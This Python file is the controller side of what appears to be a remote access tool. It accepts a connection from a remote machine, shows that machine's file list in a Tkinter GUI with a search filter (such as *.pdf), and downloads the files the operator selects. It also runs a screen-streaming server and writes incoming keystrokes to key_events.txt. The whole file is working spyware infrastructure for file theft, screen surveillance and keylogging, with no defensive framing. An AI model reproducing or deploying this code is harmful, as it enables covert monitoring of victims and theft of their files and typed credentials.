import os
import socket
import pickle
import tkinter as tk
import threading
import tkinter.ttk as ttk
from tkinter import messagebox
from vidstream import StreamingServer   # pip install vidstream
from ttkthemes import ThemedStyle   # pip install ttkthemes
import fnmatch

def receive_file_list(client_socket):
    data_length = int.from_bytes(client_socket.recv(4), 'big')
    data = b''
    while len(data) < data_length:
        packet = client_socket.recv(data_length - len(data))
        if not packet:
            break
        data += packet

    # Keep receiving until the delimiter is found
    delimiter = b'<<END_OF_DATA>>'
    while not data.endswith(delimiter):
        packet = client_socket.recv(1024)
        if not packet:
            break
        data += packet

    # Remove the delimiter from the received data
    data = data.rstrip(delimiter)

    # Unpickle the received data
    file_list = pickle.loads(data)

    print("Received file list:")
    for file_path in file_list:
        print(file_path)

    def download_selected_files():
        selected_files = listbox.curselection()
        for index in selected_files:
            selected_file = listbox.get(index)
            client_socket.sendall(selected_file.encode())

            # Receive the file size from the client as binary representation (4 bytes)
            file_size_bytes = client_socket.recv(4)

            # Unpack the binary data to get the file size as an integer
            file_size = int.from_bytes(file_size_bytes, 'big')
            print(f"\nReceiving file: {selected_file} ({file_size} bytes)")

            # Receive and save the file contents from the client
            with open(os.path.basename(selected_file), 'wb') as file:
                bytes_received = 0
                while bytes_received < file_size:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    file.write(data)
                    bytes_received += len(data)

                    # Update the progress bar
                    progress_var.set(bytes_received)

                # Reset the progress bar after download completion
                progress_var.set(0)

            print(f"File {selected_file} downloaded.")

        messagebox.showinfo("Download Complete", "Selected files have been downloaded successfully!")

    def download_thread():
        download_selected_files()

    def filter_list(*args):
        search_term = search_var.get()

        if search_term.lower().startswith("*."):
            # Special case for pattern matching (*.pdf, *.xlsx, etc.)
            pattern = search_term.lower()[2:]
            filtered_files = [file_path for file_path in file_list if fnmatch.fnmatch(file_path.lower(), f"*.{pattern}")]
        else:
            filtered_files = [file_path for file_path in file_list if search_term.lower() in file_path.lower()]

        listbox.delete(0, tk.END)
        for file_path in filtered_files:
            listbox.insert(tk.END, file_path)

    def clear_placeholder(event):
        # Clear the placeholder text when the search box is clicked
        if search_var.get() == "Enter search term or *.pdf":
            search_entry.delete(0, tk.END)

    root = tk.Tk()
    root.title("File Download")
    root.geometry("600x500")

    # Apply the theme to ttk widgets
    style = ThemedStyle(root)
    style.set_theme("equilux")  # Change the theme name here (e.g., 'arc', 'black', 'clearlooks', 'equilux', 'plastik', etc.)

    # Create the main frame and set its properties
    listbox_frame = tk.Frame(root)
    listbox_frame.pack(fill=tk.BOTH, expand=True)

    # Create the search bar entry
    search_var = tk.StringVar()
    search_entry = ttk.Entry(root, textvariable=search_var, width=50)  # Set the width of the search bar
    search_entry.pack(side=tk.TOP, padx=10, pady=5)
    # Add a placeholder (initial text display) to the search box
    search_entry.insert(0, "Enter search term or *.pdf")  # Customize the placeholder text here
    # Center-align the placeholder text
    search_entry.config(justify=tk.CENTER)
    # Bind events to the search box
    search_entry.bind('<Button-1>', clear_placeholder)
    # Set up the trace on the search variable to filter the list as the user types
    search_var.trace_add('write', filter_list)

    # Create the listbox and set its properties
    listbox = tk.Listbox(listbox_frame, selectmode=tk.MULTIPLE, background='#2b2b2b', foreground='white', font=('Arial', 10))
    listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    # Add a vertical scrollbar to the listbox
    scrollbar = tk.Scrollbar(listbox_frame, orient=tk.VERTICAL, command=listbox.yview)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    listbox.config(yscrollcommand=scrollbar.set)

    for file_path in file_list:
        listbox.insert(tk.END, file_path)

    download_button = tk.Button(root, text="Download Selected Files", command=lambda: threading.Thread(target=download_thread).start())
    download_button.pack(side=tk.BOTTOM, pady=5)

    progress_label = tk.Label(root, text="Download Progress:")
    progress_label.pack(side=tk.BOTTOM, pady=5)

    # Create a progress bar using ttk.Progressbar
    progress_var = tk.DoubleVar()
    progress_bar = ttk.Progressbar(root, variable=progress_var, maximum=100)
    progress_bar.pack(side=tk.BOTTOM, fill=tk.X, padx=10, pady=5)

    root.mainloop()

    client_socket.sendall('exit'.encode())
    client_socket.close()

def start_server():
    server = StreamingServer('0.0.0.0', 9999)
    server.start_server()

def receive_key_events():
    server_ip = '0.0.0.0'  # Bind to all available network interfaces
    server_port = 9998

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen(1)

    #print("Waiting for a client to connect...")
    client_socket, client_address = server_socket.accept()
    #print("Client connected:", client_address)

    try:
        with open("key_events.txt", "a") as file:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break

                key_event = data.decode()
                print("Received key event:", key_event)

                # Append the key event to the text file
                file.write(key_event + '\n')
                file.flush()  # Ensure data is written to the file immediately

    except KeyboardInterrupt:
        pass

    client_socket.close()
    server_socket.close()

def start_server_thread():
    server_thread = threading.Thread(target=start_server)
    server_thread.start()

def receive_file_list_thread(client_socket):
    file_thread = threading.Thread(target=receive_file_list, args=(client_socket,))
    file_thread.start()

def receive_key_events_thread():
    key_event_thread = threading.Thread(target=receive_key_events)
    key_event_thread.start()

if __name__ == "__main__":
    # Start the server for file download in a separate thread
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 9988))
    server_socket.listen(1)

    print("Waiting for a client to connect...")
    client_socket, client_address = server_socket.accept()
    print("Client connected:", client_address)

    start_server_thread()
    receive_file_list_thread(client_socket)
    receive_key_events_thread()

    server_socket.close()
